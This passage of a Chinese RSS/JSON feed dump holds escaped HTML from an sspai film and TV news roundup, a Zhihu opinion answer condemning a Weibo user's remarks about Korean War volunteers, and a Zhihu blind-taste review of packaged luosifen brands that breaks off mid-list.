日，由阮凤仪执导，林嘉欣、方郁婷主演的的电影《美国女孩》发布先导预告。该片是导演阮凤仪的首部剧情长片，创作灵感源自其本人的真实故事，已提名包括最佳剧情片、最佳新导演、最佳女主角在内的 7 项金马奖。</p>\n<p><a href=\"https://www.bilibili.com/video/BV14f4y177jU\" target=\"_blank\"><strong>科林·费斯新片《绞肉行动》发布新预告</strong></a><strong>：</strong>10 月 5 日，科林·费斯主演二战题材新片《绞肉行动》发布新预告。影片改编自真实历史事件，由约翰·马登执导，凯莉·麦克唐纳、马修·麦克菲迪恩、佩内洛普·威尔顿、詹森·艾萨克、约翰尼·弗林、西蒙·拉塞尔·比尔等出演，将于 2022 年 1 月 7 日英国上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1pv411g7Cy\" target=\"_blank\"><strong>《亿万》第六季 2022 年 1 月 23 日开播</strong></a><strong>：</strong>10 月 4 日，《亿万》第六季首曝预告，保罗·吉亚玛提、寇瑞·斯托尔、玛姬·丝弗等继续主演。第六季共 12 集，将于 2022 年 1 月 23 日开播。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1QQ4y1Q7uE\" target=\"_blank\"><strong>游戏改 TV 动画《Love Live! 虹咲学园学园偶像同好会》第二季定档</strong></a><strong>：</strong>将于 2022 年 4 月开始播出，同时公开了新人设与主视觉图。</p>\n<h2>📽 影视新闻周报</h2>\n<h3>Apple TV+ 正式续订《基地》第二季</h3>\n<p>Apple TV+ 正式续订《基地》第二季。该剧改编自艾萨克·阿西莫夫创作的科幻小说《基地三部曲》，李·佩斯、杰瑞德·哈里斯主演。首季已于 9 月 24 日开播。</p>\n<h3>英剧《浴血黑帮》将制作电影版</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/c0ebcf00e48f80d310befa2f82ba5096.png\"></figure><p>10 月 7 日，英剧《浴血黑帮》宣布剧终季第六季将于明年春季开播，并确定制作电影版，并将于 2023 年投入制作。电影版的故事将会是整个系列的大结局。</p>\n<h3>台剧《华灯初上》11 月 26 日上线 Netflix</h3>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/10/08/250ea9a0ab35e21a7e55f0d37f319975.png\"></figure><p>10 月 6 日，台剧《华灯初上》第一季前八集定档 11 月 26 日上线 Netflix。《华灯初上》全剧分三季共 24 集，由连奕琦执导，林心如担任总制作人，林心如、杨谨华、杨祐宁、刘品言、郭雪芙主演，吴慷仁、郑元畅、王柏杰客串出演。</p>\n<h3>西蒙·金伯格执导电影《355》发布全新海报</h3>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/10/08/54e3b423d601a3dd9831de2285a6a5f9.jpeg\"></figure><p>10 月 8 日，由西蒙·金伯格执导，杰西卡·查斯坦、戴安·克鲁格、露皮塔·尼永奥、佩内洛普·克鲁兹、塞巴斯蒂安·斯坦、埃德加·拉米雷兹等出演的女性间谍题材影片《355》发布全新海报和 <a href=\"https://www.bilibili.com/video/BV16q4y1R7KH\" target=\"_blank\">新正式预告</a>。该片将于 2022 年 1 月 7 日北美上映。</p>\n<h3>更多</h3>\n<p><strong>厄休拉·勒古恩科幻小说《一无所有》将拍成剧集：</strong>10 月 5 日，据媒体报道，厄休拉·勒古恩的科幻小说《一无所有》将拍成剧集，1212 娱乐公司和 Anonymous Content 联手制作。《一无所有》于 1974 年发行，曾获星云奖和雨果奖。</p>\n<p><strong>《新自杀小队》衍生剧集《和平使者》2022 年 1 月上线：</strong>10 月 5 日，电影《新自杀小队》衍生剧集《和平使者》公布了 <a href=\"https://www.bilibili.com/video/BV1hP4y187VB\" target=\"_blank\">首支片段</a>，第一季共 8 集，将于 2022 年 1 月 16 日登陆 HBO Max。本作剧本由导演詹姆斯·古恩撰写，设定在电影之前，约翰·塞纳继续饰演角色和平使者，讲述其起源故事，史蒂夫·阿吉、丹妮埃拉·布鲁克斯、克里斯托弗·赫耶达尔、詹尼佛·霍兰德等亦将出演。 <a href=\"https://twitter.com/hbomax/status/1445317684913115137\">来源</a> </p>\n<h2>🎪 彩蛋</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/a1bf1480a3953215ac075506c31481e2.jpg\"></figure><p>本期的彩蛋是由中奖读者 <a class=\"ss-atUser\" data-mention=\"@Ta\" user-id=\"c49p245b34tde3i5gm5g\" href=\"https://sspai.com/u/otter\">@Ta</a> 提供的「看图猜电影」，首位猜中片名的读者，可获得彩蛋提供名额 1 次（彩蛋内容包括但不限于「猜电影」「你喜欢的经典影视作品/影人/台词」「电影冷知识」），</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/8cb8009742471e787a0dfa0179eed2da.jpg\"></figure><p>🎁 本期彩蛋还有两道附加题，其中的「关键词猜电影」由读者 <a class=\"ss-atUser\" data-mention=\"@从来没有岁月能长留\" user-id=\"bs2p325b34tch279laig\" href=\"https://sspai.com/u/oi1rpq88\">@从来没有岁月能长留</a> 提供。全部答对的朋友除了彩蛋提供名额，还可以获得少数派周边一份！本期猜中的「第一名」将会在这篇文章中更新，届时也请各位参与互动的朋友注意站内私信~</p>\n<p>🎬 你可能错过：<a href=\"https://sspai.com/post/69093\" target=\"_blank\"><strong>看什么· 特别篇丨这 10 部电影，让你不再错过秋天的短暂赏味期</strong></a><strong> </strong>🍁</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69183"},{"title":"如何看待微博网民@罗昌平 近日针对志愿军烈士发表侮辱言论，目前已被刑拘？","date":"2021-10-08 08:34:15","description":"\n<p><b>辱骂“冰雕连”、污蔑抗美援朝先烈，我们绝不答应！</b></p>\n<p>10月6日，拥有数百万粉丝的某博主在微博上公然侮辱志愿军英烈。微博一出，立刻引发全民声讨。当晚解放军媒体官方微博账号<b>@钧正平</b>发表评论<b>《辱骂“冰雕连”，良心何在！》</b></p>\n<p>随着电影《长津湖》的热映，中国人民志愿军的故事再次引发讨论。抗美援朝战争中志愿军为了合围美军，宁可冻死也不撤出阵地。志愿军“冰雕连”的战斗事迹，每次提起都让人潸然泪下。</p>\n<a href=\"https://www.zhihu.com/video/1429845645876600832\"></a><p>电影原型周全弟是“冰雕连”的幸存者，零下40度的雪地里他趴了三天三夜，四肢全部被冻坏。手术后昏迷七天七夜他却说，<b>“我遗憾没能完成任务。”</b></p>\n<p>从战场上幸存下来这位15岁的少年，却永远地失去了四肢。他克服常人难以想象的困难，重新学习穿衣、吃饭，努力做到生活自理。</p>\n<p>我们怎么能够容忍有人玷污这样的英雄！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-fde93d42ff676f05a716c018322d2ebb_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"823\" data-rawheight=\"1175\" data-watermark=\"original\" data-original-src=\"v2-fde93d42ff676f05a716c018322d2ebb\" data-watermark-src=\"v2-a74cc75ef828c1f7ad7ffce2db60d2f7\" data-private-watermark-src=\"v2-13f62049584643d82c3647cd833360bf\"></p>\n<p>一边过着前人舍生忘死换来的幸福生活</p>\n<p>一边昧着良心肆意污蔑志愿军英烈</p>\n<p><b>这种人，良心何在！</b></p>\n<p><b>这种行为</b></p>\n<p><b>我们绝不容忍、绝不答应！</b></p>\n<p><br></p>\n<p><b>最新消息：目前，三亚市公安局吉阳分局已经以涉嫌“侵害英雄烈士名誉、荣誉罪”对其刑事拘留，案件正在进一步办理中。</b></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-tui-yi-jun-ren-80?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国退役军人</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/491084605/answer/2160316092?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">582 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/291493673?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么在烈士新闻底下总有人辱骂烈士或者公务人员？</a><br><a href=\"http://www.zhihu.com/question/325016341?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待近些年来利用侮辱国难英烈为由诱导舆论的行为？</a><br>\n","link":"http://www.zhihu.com/question/491084605/answer/2160316092?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"淘宝上的螺蛳粉哪个牌子最好吃？","date":"2021-10-08 08:31:25","description":"\n<p>过去的两个星期，我下单了近103个品牌100<b>多种</b>螺蛳粉，<b>还专程去了一趟螺蛳粉之都：柳州！！</b>吃遍了能找到的所有品牌，工伤胖五斤！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6b014759b0c217b3bbfa31fcd88b1d19_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1333\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-6b014759b0c217b3bbfa31fcd88b1d19\" data-watermark-src=\"v2-40655da1b85d13f16b354c1e0afad44f\" data-private-watermark-src=\"v2-819ed923e309f7f6e881b8247adc488b\"></p>\n<p>所有的一切，只有一个目的：<b>挑选出市面上真正好吃的螺蛳粉，推荐给大家！</b></p>\n<p>说明：<b>本文全程无广，且一定是史上最全的螺蛳粉测评。</b></p>\n<blockquote>感谢 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/9f4fb22e0686450a11c6d5dc122e4888\" data-hash=\"9f4fb22e0686450a11c6d5dc122e4888\" data-hovercard=\"p$b$9f4fb22e0686450a11c6d5dc122e4888\">@知乎生活</a> 邀请。特别开心作为翻牌众测嘉宾，测评超爱的螺蛳粉！</blockquote>\n<p><b>测评开始前：选品</b></p>\n<p>大概用了三天时间，通过各种途径搜罗到了近100种螺蛳粉品牌，下单的那一刻，感受到了从未有过的满足感！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-ec7cfa20ec003e91e8a79dc537d28f45_720w.jpg?rss\" data-rawwidth=\"5472\" data-rawheight=\"3648\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ec7cfa20ec003e91e8a79dc537d28f45\" data-watermark-src=\"v2-b97ddae11bae889ff6891d0297ddcd5d\" data-private-watermark-src=\"v2-3ca6a30071e2ac3000524166fb1821a2\"></p>\n<p>为了保证测评维度的统一，没有选择干拌型或者是炒螺蛳粉。另外，【冲泡型螺蛳粉】，因为口感太差，也被我在选品阶段就直接PASS。。 </p>\n<p>全部收到之后开心到模糊，来个大合影！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ae3b412ce8f4ed46ec71e38983db3464_720w.jpg?rss\" data-rawwidth=\"5472\" data-rawheight=\"3648\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ae3b412ce8f4ed46ec71e38983db3464\" data-watermark-src=\"v2-1386bb3f43935c183b52276a3f18a4b9\" data-private-watermark-src=\"v2-59f8a478ce3213f632ff1bb7707f8e04\"></p>\n<p><b>调查：大家觉得什么样的螺蛳粉才好吃？</b></p>\n<p>在开始正式测评之前，我在知乎发了一条想法。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1a25d102f37f379649d0b2779997282d_720w.jpg?rss\" data-rawwidth=\"1125\" data-rawheight=\"1603\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-1a25d102f37f379649d0b2779997282d\" data-watermark-src=\"v2-24ff0a61e517e06be9071ccdcdd5515c\" data-private-watermark-src=\"v2-e4f3148ddbdbee96456df58d92c81ccf\"></p>\n<p>除了感受到大家对螺蛳粉的热情之外，还收获了大家对“一碗什么样的螺蛳粉才好吃？”这件事，百花齐放的见解：</p>\n<ul>\n<li>“一定要辣，也要臭，但不能太咸！</li>\n<li>“辣味不能是太呛喉的那种，一定要是香辣！”</li>\n<li>“粉的口感要足够Q弹。”</li>\n<li>“汤一定要鲜，层次丰富！”</li>\n<li>“希望酸笋、酸豆角这一类的腌制品，香味够天然，而不是一股化学俗成味！”</li>\n</ul>\n<p>层次逐渐丰富，思路越来越清晰，根据大家关心的各个维度，我和大皮皮整理除了一份表格，在试吃过程中打分。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7975846a11ef20a125465ea89496dbf3_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7975846a11ef20a125465ea89496dbf3\" data-watermark-src=\"v2-c00dbaf1a8ff459111bfc4b8807ca41b\" data-private-watermark-src=\"v2-2cd471517801c77915e159ba299674c6\"></p>\n<p>所以，就等着我给大家交出一份满意的答案叭！！</p>\n<p><b>测评步骤：</b></p>\n<p>我们这次的测评分三步。</p>\n<ol>\n<li>试吃买到的所有螺蛳粉，排除掉口感劣质，味道不好，不值得推荐的。</li>\n<li>瞬移到柳州，吃当地最好吃的螺蛳粉。</li>\n<li>再次对比，选出和刚出锅的地道螺蛳粉最接近的。</li>\n</ol>\n<p><br></p>\n<h3>包装螺蛳粉试吃过程：</h3>\n<p>话不多说，这就开泡！</p>\n<p>这次的测评有一个重点：所有人都是 盲吃！！！在吃的过程中，绝对不会有一个人知道，自己此刻吃的到底是哪一个品牌。这样就避免了我们因为对某些品牌先入为主的偏爱，或者是负面印象，而带入印象分！</p>\n<p>我们给每个品牌都编了号码，在试吃之前，把每一包螺蛳粉都拆掉外包装，放进每个品牌相应编号的碗里。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2595b08650eb28300d1e8d02eca217a5_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1333\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-2595b08650eb28300d1e8d02eca217a5\" data-watermark-src=\"v2-9ba360867db69c1146e38948dbcc0034\" data-private-watermark-src=\"v2-18632b36bef25fd32151a6f9b3d23750\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-34af0de9cf93f130531007044c07179a_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1333\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-34af0de9cf93f130531007044c07179a\" data-watermark-src=\"v2-6cbe2518f3ee23cd757d8c843b5e951e\" data-private-watermark-src=\"v2-e0b0096ec007ffd6957332afcb9ef0b9\"></p>\n<p>给这些嗷嗷待煮的螺蛳粉来张合影。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-4431b82f740e5b60914a5a614f89a4a5_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1333\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-4431b82f740e5b60914a5a614f89a4a5\" data-watermark-src=\"v2-780ebda3c22348216ca549d68d15b499\" data-private-watermark-src=\"v2-6354cbdd9fb3d6ab845d19ea75385140\"></p>\n<p>煮粉工具有没有很专业？</p>\n<p><img src=\"https://pic3.zhimg.com/v2-85476441733a1177e292730370768353_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1333\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-85476441733a1177e292730370768353\" data-watermark-src=\"v2-3ba47ce9fee62a63588c4df64b32b002\" data-private-watermark-src=\"v2-d1846f1a0966793b525ef44ca5bbebec\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-2b9569f9894e6688eb9dc53c5d722732_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1333\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-2b9569f9894e6688eb9dc53c5d722732\" data-watermark-src=\"v2-1bebab38fb97f55ec313d68849b3944d\" data-private-watermark-src=\"v2-b20e1cd6ab8e0b6ab601cb215e1e1b0f\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-feb466924816c1304776a89fdf489aa8_720w.gif?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-feb466924816c1304776a89fdf489aa8\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>为了效率更高，结果更客观，还特意邀请了【大理嗦粉天团】。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-22cb1876221afdc7a970a15a5cba110b_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1333\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-22cb1876221afdc7a970a15a5cba110b\" data-watermark-src=\"v2-22aafef4d0c5c9c018f69d5e0664e6d0\" data-private-watermark-src=\"v2-dc8c1077d76b94ed5697e8e92b8b3a80\"></p>\n<p>他们来自全国各地，口味各有偏好，但都是吃遍大江南北，<b>热爱螺蛳粉</b>的资深吃货。</p>\n<p>看到他们那一张张对螺蛳粉满怀渴望的脸，我就有绝对的信心。我们这群爱吃、懂吃的人挑出的螺蛳粉，绝对不一般！</p>\n<p>从清晨到日落，家里弥漫着不可言说的臭味，我们在臭味中敬业的试吃、记录。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b140458d08faaf6c83976fd8e2c0e0e2_720w.gif?rss\" data-rawwidth=\"850\" data-rawheight=\"478\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b140458d08faaf6c83976fd8e2c0e0e2\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-3edc287505e4b46edb3b587f891c86a4_720w.gif?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3edc287505e4b46edb3b587f891c86a4\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-d5f555d6a9512102c8746a9c835cf617_720w.gif?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d5f555d6a9512102c8746a9c835cf617\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>每一种螺蛳粉都严格按说明煮，包括<b>水量、煮粉时间，各种食材的先后顺序</b>。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-8c638e1fabd5a100b8491bc1863eac97_720w.gif?rss\" data-rawwidth=\"729\" data-rawheight=\"410\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8c638e1fabd5a100b8491bc1863eac97\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>经过这一轮，已经有一大批选手，因为口味、口感、品质的原因，而惨遭淘汰。</p>\n<h2>开始柳州寻味之旅：</h2>\n<p>留着幸存螺蛳粉品牌的味蕾记忆，一刻也不能耽误，我们一家人，带着螺蛳粉的酸臭，马不停蹄的踏上了去柳州的旅程。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2087c11ddf81f108cc2bb86acc306150_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-2087c11ddf81f108cc2bb86acc306150\" data-watermark-src=\"v2-f4b2f9df5d7fff5701e3a8cdb4d73d2f\" data-private-watermark-src=\"v2-81dcb8123fedfd0496d89a2718541772\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-35aae4c5f48234cc2d88331059d89ee1_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-35aae4c5f48234cc2d88331059d89ee1\" data-watermark-src=\"v2-2e2c90ab6e88bb68005dc0b25a1983c6\" data-private-watermark-src=\"v2-52c89ba5b0b6937895d74552f0e5ef04\"></p>\n<p>根据提前做好的功课、我们在柳州吃了8家网红粉店。</p>\n<p>它们分别是：</p>\n<p><b>西环肥仔、聚宝、罗忆、娇姐、凤张、金旺、翠翠家，和路边的一家不知明小店。</b></p>\n<p>除了一家踩雷，其他的每一家都好吃得各有特色。店里吃到的螺蛳粉，<b>汤底层次丰富，香、辣、咸、甜、鲜、配菜丰富又新鲜</b>。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1c22fe67947c6a6e78f64c6f8312e16b_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-1c22fe67947c6a6e78f64c6f8312e16b\" data-watermark-src=\"v2-21f7ce1afb8ecf09e3390f405b2be99a\" data-private-watermark-src=\"v2-73ea4eab45e61db2323b2e0cbb7a193b\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-2c9e0501c1866f9ff7124b8a282124be_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-2c9e0501c1866f9ff7124b8a282124be\" data-watermark-src=\"v2-8a0153f51456c78edd2c2b58b7678984\" data-private-watermark-src=\"v2-6b15b13fa727da884b92164e575da0c6\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-0935c2521580b523afe950ffca96c5ee_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-0935c2521580b523afe950ffca96c5ee\" data-watermark-src=\"v2-8038f848390ba4f0a3ddee14fdce5d39\" data-private-watermark-src=\"v2-437e14ba6d8459350ff9f2d5dd399a2f\"></p>\n<p>我们连着吃了好多顿也不腻，在来往于各个螺蛳粉店的出租车上，我和大皮皮感慨：螺蛳粉真是个很棒的食物！层次丰富、回味无穷，很难吃腻！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-000cc04efd4e361b32dd48f933a6a1d4_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-000cc04efd4e361b32dd48f933a6a1d4\" data-watermark-src=\"v2-f00d8b736e6cd49495d13e700ed96755\" data-private-watermark-src=\"v2-d8fbf4f5827e2442a675d329366d48ae\"></p>\n<p>在探店过程中，刚好遇到凤张的老板在店里，赶紧抓住机会采访了一下。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-3c6280935818afdb52043f8ded1d0bb6_720w.gif?rss\" data-rawwidth=\"753\" data-rawheight=\"424\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3c6280935818afdb52043f8ded1d0bb6\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>老板人很好，毫无保留的向我们道出了螺蛳粉好吃的精髓与秘籍：</p>\n<blockquote>\n<b>汤底一定要用骨头搭配螺蛳，再加上丰富的香料一起熬制，咸香十足，回味无穷。</b><br><b>泡制的螺蛳确实有臭味，但每天备用的酸笋都会提前炒香，“香臭”完美融合，并不是单纯的臭。</b><br><b>腐竹薄一些口感更好，并且一定要用品质好的油来炸，保证没有怪味。</b><br><b>花生米一定要新鲜、香脆，火候必须控制好。</b>\n</blockquote>\n<p><img src=\"https://pic1.zhimg.com/v2-c8056d364ce6fa616b98c9b9e5c1c8fc_720w.gif?rss\" data-rawwidth=\"797\" data-rawheight=\"448\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-c8056d364ce6fa616b98c9b9e5c1c8fc\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h2>测评结果来啦！！！：</h2>\n<p>带着在柳州深度品尝，和采访螺蛳粉店老板所得出的这份秘籍，和最直接的试吃感受，我们再次回到大理，综合：<b>米粉口感、酸笋的味道、汤底层次、配菜的丰富程度，以及个人评分和推荐程度。</b>我们总结出了一份骨灰级贴心的推荐表格。</p>\n<p>推荐之前要说明一件事。很多人说，网上买的包装螺蛳粉比起在柳州店里吃的，差太多太远。但我认真品尝之后得出的结论并不是如此。</p>\n<p>网购的包装螺蛳粉，如果品质过关，其实在<b>汤底的味道上，完全可以做到还原</b>。有差别的只是配菜丰富度，和配菜的口感。总的来说，只要选对了，包装螺蛳粉的味道也并不差！</p>\n<p>这里分<b>【好吃必买榜】、【拉黑避雷榜】</b>和<b>【可以一试】</b>三个纬度给大家列出表格。至于一些味道太过于平庸，不值一提，也没有明显槽点的品牌，就直接忽略了。</p>\n<p><b>好吃必买推荐榜：</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-8e719b5571715e9b8d570ef912c55ac4_720w.jpg?rss\" data-rawwidth=\"3675\" data-rawheight=\"2558\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8e719b5571715e9b8d570ef912c55ac4\" data-watermark-src=\"v2-3d333071aa1c9284d3755672e24ae124\" data-private-watermark-src=\"v2-f1c8a29d8475abe0a250ea3bc6f3e399\"></p>\n<p>这些被推选上<b>【必买榜单】</b>的牌子，都是首先惊艳评委们的味蕾，又被大家反复品尝、分析、回味，最终被一致认可的。拍胸脯说，只要你爱吃螺蛳粉，都可以闭眼买，不会踩雷！！</p>\n<p><b>1、螺霸王菌菇味</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-33ee621b78ea0c46cf2512a88378f5ef_720w.jpg?rss\" data-rawwidth=\"3000\" data-rawheight=\"2000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-33ee621b78ea0c46cf2512a88378f5ef\" data-watermark-src=\"v2-55c12f0de1c52279b616db81a2cdcfbb\" data-private-watermark-src=\"v2-bfc59b11d399d8318f465d5e347979e5\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-be3b8f04e23458b012cbd41e9d063d5c_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-be3b8f04e23458b012cbd41e9d063d5c\" data-watermark-src=\"v2-db586698aa15e36a52948c2c8b6ec0ad\" data-private-watermark-src=\"v2-efcd6e76d4d3629634d518402d10fa0a\"></p>\n<p>如果不是粉丝特别推荐，差点就错过，因为从包装来看，实在不像好吃的样子。但实际上这是最受大家好评的一包。</p>\n<p>有菌菇包是其次，关键是<b>整碗粉的味道都超级好</b>！可以说是一百多碗里最好吃的一碗了。<b>香香辣辣，汤头层次丰富</b>，喝起来既特别又过瘾。除了非常丰富的配菜，还有蛋白条和菌菇包。菌菇是酸脆的，味道和汤底本味融合在一起很和谐。木耳和酸笋也很脆。总之味道和口感都超级赞！收获了好几位评委的满分推荐！</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429829991610032128\"></a><p><b>2、柳江人家</b></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-af69cea6bb4588cc756b922716168936_720w.jpg?rss\" data-rawwidth=\"1269\" data-rawheight=\"846\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-af69cea6bb4588cc756b922716168936\" data-watermark-src=\"v2-f5a03de2bc8aec400203c9c68f20fcf4\" data-private-watermark-src=\"v2-f4c1c95bb34fc0bde6e4ebc90c7d2a2f\"></p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-45c2833bd6e8b54aa6c97db9ae7f84bf_720w.jpg?rss\" data-rawwidth=\"1268\" data-rawheight=\"713\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-45c2833bd6e8b54aa6c97db9ae7f84bf\" data-watermark-src=\"v2-d0c1784630837f4156bb4763bef22218\" data-private-watermark-src=\"v2-db4677c9826bbec737ebb9fcec777c16\"></p>\n<p>同上，整体味道就是很棒！很辣很鲜好吃。汤底味道很丰富，<b>麻辣鲜香搭配得恰到好处</b>，喝一口汤就回味无穷。并且粉丝Q弹，腐竹也超级新鲜，有股清甜的豆香味，香脆的腐竹吸上层次饱满的汤汁，入口超级过瘾！<b>麻辣爱好者推荐！</b></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429830658559008768\"></a><p><b>3.螺行江湖</b></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-03d1beb9170fa086b8e2cf676ace0c77_720w.jpg?rss\" data-rawwidth=\"1269\" data-rawheight=\"846\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-03d1beb9170fa086b8e2cf676ace0c77\" data-watermark-src=\"v2-80a216c9ab2df6cbbd626429477ec5f3\" data-private-watermark-src=\"v2-a8a3e41ecbab9f195040fc6279da5bbe\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-141f6ee390a66842bf78cf6984606b49_720w.jpg?rss\" data-rawwidth=\"1268\" data-rawheight=\"713\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" 